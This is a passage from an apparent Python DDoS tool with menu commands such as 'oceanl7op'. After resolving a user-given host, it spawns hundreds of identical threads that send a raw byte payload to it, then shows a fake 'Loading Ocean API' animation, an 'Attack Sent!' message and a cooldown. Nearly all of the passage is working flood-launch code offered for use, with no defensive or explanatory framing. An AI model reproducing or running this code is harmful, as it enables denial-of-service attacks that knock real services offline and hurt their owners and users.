					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear")
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "oceanl7op":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
